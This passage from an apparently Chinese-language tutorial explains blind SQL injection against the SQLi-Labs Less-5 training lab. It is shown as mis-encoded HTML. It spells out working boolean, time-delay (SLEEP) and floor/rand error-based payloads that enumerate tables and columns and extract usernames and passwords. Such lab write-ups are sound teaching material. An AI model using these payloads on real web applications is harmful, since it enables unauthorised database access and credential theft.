ï¼ˆå¦‚200&#x2F;500ï¼‰ã€å“åº”æ—¶é—´å·®å¼‚ï¼ˆæ—¶é—´ç›²æ³¨ï¼‰ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯é¡µé¢ä¸ä¼šè¿”å›sqlè¯­å¥æ‰§è¡Œé”™è¯¯çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡é¡µé¢çš„æ­£å¸¸ä¸ä¸æ­£å¸¸æ˜¾ç¤ºæ¥åˆ¤æ–­ã€‚</p><h5 id="2ã€åˆ†ç±»"><a href="#2ã€åˆ†ç±»" class="headerlink" title="2ã€åˆ†ç±»"></a><strong>2ã€åˆ†ç±»</strong></h5><p>å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€æŠ¥é”™ç›²æ³¨</p><hr><h5 id="3ã€å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-Based-Blind-SQLiï¼‰"><a href="#3ã€å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-Based-Blind-SQLiï¼‰" class="headerlink" title="3ã€å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-Based Blind SQLiï¼‰"></a><strong>3ã€å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-Based Blind SQLiï¼‰</strong></h5><p>å¸ƒå°”ç›²æ³¨é€šè¿‡æ„é€  <strong>é€»è¾‘æ¡ä»¶ï¼ˆçœŸ&#x2F;å‡ï¼‰</strong>ï¼Œè§‚å¯Ÿé¡µé¢è¿”å›ç»“æœçš„å·®å¼‚ï¼Œé€ä½æ¨æ–­æ•°æ®åº“ä¿¡æ¯ã€‚æ¡ä»¶ä¸ºçœŸ â†’ é¡µé¢æ˜¾ç¤ºæ­£å¸¸å†…å®¹ï¼ˆå¦‚â€œYou are inâ€¦â€ï¼‰ï¼›æ¡ä»¶ä¸ºå‡ â†’ é¡µé¢æ— å†…å®¹æˆ–æ˜¾ç¤ºé”™è¯¯</p><p><strong>ï¼ˆ1ï¼‰å¦‚ä½•åˆ¤æ–­å¸ƒå°”ç›²æ³¨ï¼Ÿ</strong></p><p>ä»¥ <strong>SQLi-Labs Less-5</strong> ä¸ºä¾‹ï¼š</p><p><strong>æ­¥éª¤1ï¼šç¡®è®¤æ³¨å…¥ç‚¹ç±»å‹</strong></p><ol><li>è¾“å…¥ <code>?id=1&#39;</code>ï¼Œé¡µé¢è¿”å›å¼‚å¸¸ï¼ˆå¯èƒ½ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼‰ã€‚</li><li>é—­åˆå•å¼•å·ï¼š<code>?id=1&#39; --+</code>ï¼Œé¡µé¢æ¢å¤æ­£å¸¸ â†’ <strong>å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</strong>ã€‚</li></ol><p><strong>æ­¥éª¤2ï¼šéªŒè¯å¸ƒå°”ç›²æ³¨</strong></p><p>æ„é€  <strong>çœŸ&#x2F;å‡æ¡ä»¶</strong>ï¼Œè§‚å¯Ÿé¡µé¢å·®å¼‚ï¼š</p><ul><li><strong>çœŸæ¡ä»¶</strong>ï¼š<code>?id=1&#39; and 1=1 --+</code> â†’ é¡µé¢æ­£å¸¸ï¼ˆå¦‚æ˜¾ç¤ºå†…å®¹ï¼‰ã€‚</li><li><strong>å‡æ¡ä»¶</strong>ï¼š<code>?id=1&#39; and 1=2 --+</code> â†’ é¡µé¢å¼‚å¸¸ï¼ˆæ— å†…å®¹ï¼‰ã€‚</li></ul><p><strong>ç»“è®º</strong>ï¼šå­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼Œé¡µé¢æ ¹æ®æ¡ä»¶çœŸ&#x2F;å‡è¿”å›ä¸åŒç»“æœã€‚</p><p><strong>ï¼ˆ2ï¼‰å¸ƒå°”ç›²æ³¨çš„åˆ©ç”¨æ­¥éª¤</strong></p><p><strong>1. è·å–æ•°æ®åº“å</strong></p><ul><li><strong>çŒœè§£é•¿åº¦</strong>ï¼š<br><code>?id=1&#39; and length(database())=8 --+</code> â†’ è‹¥é¡µé¢æ­£å¸¸ï¼Œæ•°æ®åº“åé•¿åº¦ä¸º8ã€‚</li><li><strong>é€å­—ç¬¦çŒœè§£</strong>ï¼š<br><code>?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code> â†’ ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>s</code>ï¼ˆé‡å¤è‡³ç¬¬8ä¸ªå­—ç¬¦ï¼‰ã€‚</li></ul><p><strong>2. è·å–è¡¨å</strong></p><ul><li><strong>çŒœè§£è¡¨çš„æ•°é‡</strong>ï¼š<br><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+</code> â†’ ç¡®è®¤æ˜¯å¦ä¸º4å¼ è¡¨ã€‚</li><li><strong>çŒœè§£è¡¨åé•¿åº¦</strong>ï¼š<br><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code> â†’ ç¬¬ä¸€å¼ è¡¨åé•¿åº¦æ˜¯å¦ä¸º6ã€‚</li><li><strong>é€å­—ç¬¦çŒœè§£è¡¨å</strong>ï¼š<br><code>?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39; --+</code> â†’ ç¬¬ä¸€å¼ è¡¨çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>e</code>ã€‚</li></ul><p><strong>3. è·å–åˆ—å</strong></p><ul><li><strong>çŒœè§£åˆ—çš„æ•°é‡</strong>ï¼š<br><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=3 --+</code> â†’ ç¡®è®¤æ˜¯å¦ä¸º3åˆ—ã€‚</li><li><strong>é€å­—ç¬¦çŒœè§£åˆ—å</strong>ï¼š<br><code>?id=1&#39; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39; --+</code> â†’ ç¬¬ä¸€åˆ—çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>i</code>ã€‚</li></ul><p><strong>4. æå–æ•°æ®ï¼ˆå¦‚ç”¨æˆ·å&#x2F;å¯†ç ï¼‰</strong></p><ul><li><strong>çŒœè§£ç¬¬ä¸€æ¡è®°å½•çš„username</strong>ï¼š<br><code>?id=1&#39; and substr((select username from users limit 0,1),1,1)=&#39;D&#39; --+</code> â†’ ç”¨æˆ·åçš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>D</code>ã€‚</li><li><strong>çŒœè§£å¯¹åº”å¯†ç </strong>ï¼š<br><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+</code> â†’ å¯†ç çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>D</code>ã€‚</li></ul><hr><h5 id="4ã€æ—¶é—´ç›²æ³¨"><a href="#4ã€æ—¶é—´ç›²æ³¨" class="headerlink" title="4ã€æ—¶é—´ç›²æ³¨"></a><strong>4ã€æ—¶é—´ç›²æ³¨</strong></h5><p><strong>ï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯æ—¶é—´ç›²æ³¨ï¼Ÿ</strong></p><p>æ”»å‡»è€…é€šè¿‡æ„é€ SQLè¯­å¥è§¦å‘æ•°æ®åº“å»¶è¿Ÿæ‰§è¡Œï¼ˆå¦‚<code>SLEEP(2)</code>ï¼‰ï¼Œæ ¹æ®å“åº”æ—¶é—´çš„é•¿çŸ­åˆ¤æ–­æ³¨å…¥æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚</p><p><strong>ï¼ˆ2ï¼‰å¦‚ä½•åˆ¤æ–­æ—¶é—´ç›²æ³¨ï¼Ÿ</strong></p><ol><li><strong>åŸºæœ¬æµ‹è¯•</strong><br>è¾“å…¥è§¦å‘å»¶è¿Ÿçš„Payloadï¼Œè§‚å¯Ÿå“åº”æ—¶é—´æ˜¯å¦æ˜¾è‘—å¢åŠ ï¼š<code>?id=1&#39; AND SLEEP(5) --+</code>è‹¥é¡µé¢åŠ è½½æ—¶é—´è¶…è¿‡5ç§’ï¼Œå¯èƒ½å­˜åœ¨æ—¶é—´ç›²æ³¨æ¼æ´ã€‚</li><li><strong>æ¡ä»¶åŒ–æµ‹è¯•</strong><br>ç»“åˆé€»è¾‘æ¡ä»¶éªŒè¯ï¼š<code>?id=1&#39; AND IF(1=1, SLEEP(5), 0) --+  # æ¡ä»¶ä¸ºçœŸï¼Œè§¦å‘å»¶è¿Ÿ   ?id=1&#39; AND IF(1=2, SLEEP(5), 0) --+  # æ¡ä»¶ä¸ºå‡ï¼Œä¸å»¶è¿Ÿ</code>è‹¥ç¬¬ä¸€ä¸ªè¯·æ±‚å»¶è¿Ÿï¼Œç¬¬äºŒä¸ªä¸å»¶è¿Ÿ â†’ ç¡®è®¤æ—¶é—´ç›²æ³¨å­˜åœ¨ã€‚</li></ol><p><strong>(3)æ—¶é—´ç›²æ³¨åˆ©ç”¨æ­¥éª¤</strong></p><p><strong>1. è·å–æ•°æ®åº“å</strong></p><p><strong>1.1 çŒœè§£æ•°æ®åº“åé•¿åº¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿ2ç§’ï¼Œæ•°æ®åº“åé•¿åº¦ä¸º8ï¼ˆå¦‚<code>security</code>ï¼‰ã€‚</p><p><strong>1.2 é€å­—ç¬¦çŒœè§£æ•°æ®åº“å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR(database(),1,1))=115, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li><code>SUBSTR(database(),1,1)</code>ï¼šæå–æ•°æ®åº“åç¬¬1ä¸ªå­—ç¬¦ã€‚</li><li><code>ASCII(...)=115</code>ï¼šåˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦<code>s</code>ï¼ˆASCIIç 115ï¼‰ã€‚</li><li>è‹¥å»¶è¿Ÿï¼Œåˆ™ç¡®è®¤è¯¥å­—ç¬¦æ­£ç¡®ã€‚</li></ul><p><strong>2. è·å–è¡¨å</strong></p><p><strong>2.1 çŒœè§£è¡¨çš„æ•°é‡</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=4, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œå½“å‰æ•°æ®åº“æœ‰4å¼ è¡¨ã€‚</p><p><strong>2.2 çŒœè§£è¡¨åé•¿åº¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œç¬¬ä¸€å¼ è¡¨åé•¿åº¦ä¸º6ï¼ˆå¦‚<code>emails</code>ï¼‰ã€‚</p><p><strong>2.3 é€å­—ç¬¦çŒœè§£è¡¨å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=101, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>e</code>ï¼ˆASCIIç 101ï¼‰ã€‚</li></ul><p><strong>3. è·å–åˆ—å</strong></p><p><strong>3.1 çŒœè§£åˆ—çš„æ•°é‡</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="hljs-string">&#x27;)=3, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œ<code>users</code>è¡¨æœ‰3åˆ—ã€‚</p><p><strong>3.2 é€å­—ç¬¦çŒœè§£åˆ—å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="hljs-string">&#x27; LIMIT 0,1),1,1))=105, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>åˆ¤æ–­ç¬¬ä¸€åˆ—çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>i</code>ï¼ˆASCIIç 105ï¼‰ã€‚</li></ul><p><strong>4. æå–æ•°æ®ï¼ˆä»¥ç”¨æˆ·å¯†ç ä¸ºä¾‹ï¼‰</strong></p><p><strong>4.1 çŒœè§£ç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>è‹¥å»¶è¿Ÿï¼Œç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º<code>D</code>ï¼ˆASCIIç 68ï¼‰ã€‚</li></ul><p><strong>4.2 çŒœè§£å¯†ç </strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>è‹¥å»¶è¿Ÿï¼Œå¯†ç çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º<code>D</code>ã€‚</li></ul><hr><h5 id="5ã€ä½¿ç”¨ASCIIç -äºŒåˆ†æ³•ä¼˜åŒ–"><a href="#5ã€ä½¿ç”¨ASCIIç -äºŒåˆ†æ³•ä¼˜åŒ–" class="headerlink" title="5ã€ä½¿ç”¨ASCIIç  + äºŒåˆ†æ³•ä¼˜åŒ–"></a><strong>5ã€ä½¿ç”¨ASCIIç  + äºŒåˆ†æ³•ä¼˜åŒ–</strong></h5><p>å°†å­—ç¬¦è½¬æ¢ä¸ºASCIIç å€¼ï¼Œåˆ©ç”¨äºŒåˆ†æ³•å¿«é€Ÿç¼©å°èŒƒå›´ã€‚</p><p><strong>æ­¥éª¤1ï¼šå°†å­—ç¬¦è½¬ä¸ºASCIIç </strong></p><ul><li><code>&#39;s&#39;</code>çš„ASCIIç ä¸º<code>115</code>ã€‚</li><li>é€šè¿‡æ¯”è¾ƒASCIIç å€¼ï¼Œå¿«é€Ÿå®šä½å­—ç¬¦ã€‚</li></ul><p><strong>æ­¥éª¤2ï¼šäºŒåˆ†æ³•çŒœè§£</strong></p><ol><li><strong>ç¡®å®šASCIIç èŒƒå›´</strong>ï¼šå‡è®¾å­—ç¬¦ä¸ºå¯æ‰“å°å­—ç¬¦ï¼ˆASCII 32-126ï¼‰ã€‚</li><li><strong>é€æ­¥ç¼©å°èŒƒå›´</strong>ï¼š</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ascii(substr(database(),1,1)) &gt; 100 --+  # æ˜¯å¦å¤§äº100ï¼Ÿ</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">- è‹¥é¡µé¢æ­£å¸¸ï¼ˆæ¡ä»¶ä¸ºçœŸï¼‰ï¼Œè¯´æ˜ASCIIç åœ¨101-126ä¹‹é—´ã€‚- è‹¥é¡µé¢å¼‚å¸¸ï¼ˆæ¡ä»¶ä¸ºå‡ï¼‰ï¼Œè¯´æ˜ASCIIç åœ¨32-100ä¹‹é—´ã€‚</code></pre><ol start="3"><li><strong>é‡å¤äºŒåˆ†</strong>ï¼Œç›´åˆ°é”å®šå…·ä½“å€¼ã€‚</li></ol><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># çŒœè§£ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç æ˜¯å¦ä¸º<span class="hljs-number">115</span>ï¼ˆå³<span class="hljs-string">&#x27;s&#x27;</span>ï¼‰<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ascii(substr(database(),1,1))=115 --+</span><br></code></pre></td></tr></table></figure><h4 id="Less-5-å•å¼•å·å­—ç¬¦å‹-å¸ƒå°”ç›²æ³¨-æŠ¥é”™æ³¨å…¥"><a href="#Less-5-å•å¼•å·å­—ç¬¦å‹-å¸ƒå°”ç›²æ³¨-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-5-å•å¼•å·å­—ç¬¦å‹_å¸ƒå°”ç›²æ³¨_æŠ¥é”™æ³¨å…¥"></a>Less-5-å•å¼•å·å­—ç¬¦å‹_å¸ƒå°”ç›²æ³¨_æŠ¥é”™æ³¨å…¥</h4><p><strong>å¸ƒå°”ç›²æ³¨</strong></p><p>åˆ¤æ–­</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007470.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006670.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006258.png"></p><p>å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007326.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007306.png"></p><p>é¡µé¢æ ¹æ®æ¡ä»¶çœŸ&#x2F;å‡è¿”å›ä¸åŒç»“æœï¼Œè¯´æ˜å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼Œ</p><p><strong>1. è·å–æ•°æ®åº“å</strong></p><ul><li><strong>çŒœè§£é•¿åº¦</strong>ï¼š<br><code>?id=1&#39; and length(database())=8 --+</code> é¡µé¢æ­£å¸¸ï¼Œæ•°æ®åº“åé•¿åº¦ä¸º8ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007042.png"></p><ul><li><strong>é€å­—ç¬¦çŒœè§£</strong>ï¼š<br><code>?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code>  ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>s</code>ï¼ˆé‡å¤è‡³ç¬¬8ä¸ªå­—ç¬¦ï¼‰ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007799.png"></p><p><strong>çŒœè§£è¿‡ç¨‹</strong>ï¼š</p><ol><li>ç¬¬1ä¸ªå­—ç¬¦ï¼šä»ASCIIç èŒƒå›´ï¼ˆé€šå¸¸æµ‹è¯• <code>a-z</code>ã€<code>0-9</code>ã€<code>_</code>ï¼‰é€ä¸€å°è¯•ï¼Œç›´åˆ°é¡µé¢æ­£å¸¸ã€‚</li><li>ç¬¬2ä¸ªå­—ç¬¦ï¼šä¿®æ”¹ä¸º <code>substr(database(),2,1)</code>ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚</li><li>é‡å¤è‡³ç¬¬8ä¸ªå­—ç¬¦ï¼ˆ<code>substr(database(),8,1)</code>ï¼‰ã€‚</li></ol><p><strong>ASCIIç èŒƒå›´è§£æ</strong></p><table><thead><tr><th align="center">å­—ç¬¦ç±»å‹</th><th align="center">ASCIIç èŒƒå›´</th><th align="center">åŒ…å«å­—ç¬¦ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="center">æ•°å­—</td><td align="center">48-57</td><td align="center"><code>0</code>(48) ~ <code>9</code>(57)</td></tr><tr><td align="center">ä¸‹åˆ’çº¿</td><td align="center">95</td><td align="center"><code>_</code></td></tr><tr><td align="center">å°å†™å­—æ¯</td><td align="center">97-122</td><td align="center"><code>a</code>(97) ~ <code>z</code>(122)</td></tr></tbody></table><p><strong>2. è·å–è¡¨å</strong></p><ul><li><strong>çŒœè§£è¡¨çš„æ•°é‡</strong>ï¼š<br><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+</code> â†’ ç¡®è®¤ä¸º4å¼ è¡¨ã€‚</li><li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007369.png"></li><li><strong>çŒœè§£è¡¨åé•¿åº¦</strong>ï¼š<br><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code> â†’ ç¬¬ä¸€å¼ è¡¨åé•¿åº¦ä¸º6ã€‚</li><li><strong>é€å­—ç¬¦çŒœè§£è¡¨å</strong>ï¼š<br><code>?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39; --+</code> â†’ ç¬¬ä¸€å¼ è¡¨çš„ç¬¬1ä¸ªå­—ç¬¦ä¸º<code>e</code>ã€‚</li></ul><p><strong>3. è·å–åˆ—å</strong></p><ul><li><strong>çŒœè§£åˆ—çš„æ•°é‡</strong>ï¼š<br><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=3 --+</code> â†’ ç¡®è®¤ä¸º3åˆ—ã€‚</li><li><strong>é€å­—ç¬¦çŒœè§£åˆ—å</strong>ï¼š<br><code>?id=1&#39; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39; --+</code> â†’ ç¬¬ä¸€åˆ—çš„ç¬¬1ä¸ªå­—ç¬¦ä¸º<code>i</code>ã€‚</li></ul><p><strong>4. æå–æ•°æ®ï¼ˆå¦‚ç”¨æˆ·å&#x2F;å¯†ç ï¼‰</strong></p><ul><li><strong>çŒœè§£ç¬¬ä¸€æ¡è®°å½•çš„username</strong>ï¼š<br><code>?id=1&#39; and substr((select username from users limit 0,1),1,1)=&#39;D&#39; --+</code> â†’ ç”¨æˆ·åçš„ç¬¬1ä¸ªå­—ç¬¦ä¸º<code>D</code>ã€‚</li><li><strong>çŒœè§£å¯¹åº”å¯†ç </strong>ï¼š<br><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+</code> â†’ å¯†ç çš„ç¬¬1ä¸ªå­—ç¬¦ä¸º<code>D</code>ã€‚</li></ul><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p>è¿™ä¸€å…³ä¹Ÿå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p><a href="https://blog.csdn.net/2201_75556700/article/details/139115543?ops_request_misc=%7B%22request_id%22:%229b61cf9573e1a1353819cc64e0d1888b%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=9b61cf9573e1a1353819cc64e0d1888b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-139115543-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=sqli-labs-5&spm=1018.2226.3001.4187">sqli-labsâ€”ç¬¬äº”å…³_sqli-labsç¬¬äº”å…³-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_44663230/article/details/126200616?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli-labs-5&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126200616.142%5Ev102%5Epc_search_result_base7&spm=1018.2226.3001.4187">sql-labs é—¯å…³ 5~10_sqli-labs5-CSDNåšå®¢</a></p><p>1.flooræŠ¥é”™</p><p>ç”¨flooræŠ¥é”™æ³¨å…¥ï¼Œå¾—åˆ°æ•°æ®åº“åç§°ä¸ºâ€™securityâ€™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007315.png"></p><p><strong>è¯­å¥è§£æ</strong></p><ul><li><code>?id=1&#39;</code><br>é—­åˆåŸå§‹ SQL è¯­å¥çš„å•å¼•å·ï¼Œè¿›å…¥æ³¨å…¥é€»è¾‘ã€‚</li><li><code>and</code><br>å°†æ³¨å…¥çš„æ¶æ„ä»£ç ä¸åŸå§‹æŸ¥è¯¢é€»è¾‘è¿æ¥ï¼Œä½¿æ•´ä¸ªè¯­å¥ç»“æœä¸ºå¸ƒå°”å€¼ã€‚</li><li><code>select count(*) from information_schema.tables</code><br>ä»ç³»ç»Ÿè¡¨ <code>information_schema.tables</code>ï¼ˆå­˜å‚¨æ‰€æœ‰è¡¨ä¿¡æ¯ï¼‰ä¸­é€‰æ‹©æ‰€æœ‰è¡Œæ•°ã€‚æ­¤æ­¥éª¤ä»…ç”¨äºç”Ÿæˆè¶³å¤Ÿå¤šçš„æ•°æ®ä»¥è§¦å‘åç»­çš„ <code>group by</code> æŠ¥é”™ã€‚</li><li><code>group by concat(...)</code><br>å…³é”®æŠ¥é”™è§¦å‘ç‚¹ã€‚<code>group by</code> å­å¥ä¼šå¯¹ç»“æœæŒ‰æŒ‡å®šè¡¨è¾¾å¼åˆ†ç»„ï¼Œè€Œ <code>concat(...)</code> ç”Ÿæˆçš„å­—ç¬¦ä¸²å°†ä½œä¸ºåˆ†ç»„é”®ã€‚ç”±äº <code>floor(rand(14)*2)</code> çš„éšæœºæ€§ï¼ˆä½†ç§å­å›ºå®šä¸º <code>14</code>ï¼‰ï¼Œåœ¨åˆ†ç»„æ—¶å¯èƒ½å‡ºç°é‡å¤é”®å†²çªï¼Œå¯¼è‡´æŠ¥é”™ã€‚</li><li><code>floor(rand(14)*2)</code><ul><li><code>rand(14)</code>ï¼šç”Ÿæˆä¸€ä¸ªåŸºäºç§å­ <code>14</code> çš„ä¼ªéšæœºæ•°ï¼ˆå›ºå®šåºåˆ—ï¼‰ã€‚</li><li><code>rand(14)*2</code>ï¼šå°†éšæœºæ•°èŒƒå›´æ‰©å±•åˆ° [0, 2)ã€‚</li><li><code>floor()</code>ï¼šå‘ä¸‹å–æ•´ï¼Œç»“æœä¸º <code>0</code> æˆ– <code>1</code>ã€‚</li><li><strong>ä½œç”¨</strong>ï¼šç”Ÿæˆç¡®å®šæ€§åºåˆ—çš„ 0 æˆ– 1ï¼Œç”¨äºæ„é€ é‡å¤çš„åˆ†ç»„é”®ã€‚</li></ul></li><li><code>0x23</code><br>åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ <code>#</code>ï¼Œä½œä¸ºåˆ†éš”ç¬¦æé«˜æŠ¥é”™ä¿¡æ¯çš„å¯è¯»æ€§ã€‚</li><li><code>database()</code><br>å†…ç½®å‡½æ•°ï¼Œè¿”å›å½“å‰æ•°æ®åº“åç§°ï¼ˆæ­¤å¤„ä¸º <code>security</code>ï¼‰ã€‚</li><li><strong>æŠ¥é”™æœºåˆ¶</strong><br>ç”±äº <code>group by</code> åœ¨ä¸´æ—¶è¡¨ç”Ÿæˆè¿‡ç¨‹ä¸­éœ€è¦ä¸ºæ¯è¡Œè®¡ç®—åˆ†ç»„é”®ï¼Œè€Œ <code>floor(rand(14)*2)</code> çš„å€¼åœ¨è®¡ç®—è¿‡ç¨‹ä¸­å¯èƒ½å˜åŒ–ï¼Œå¯¼è‡´åŒä¸€åˆ†ç»„é”®è¢«å¤šæ¬¡æ’å…¥ä¸´æ—¶è¡¨æ—¶è§¦å‘ <code>Duplicate entry</code> é”™è¯¯ã€‚æŠ¥é”™ä¿¡æ¯ä¼šåŒ…å« <code>concat(...)</code> çš„ç»“æœï¼Œä»è€Œæ³„éœ² <code>database()</code> çš„å€¼ã€‚</li></ul><p>å¾—åˆ°æ•°æ®è¡¨åç§°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 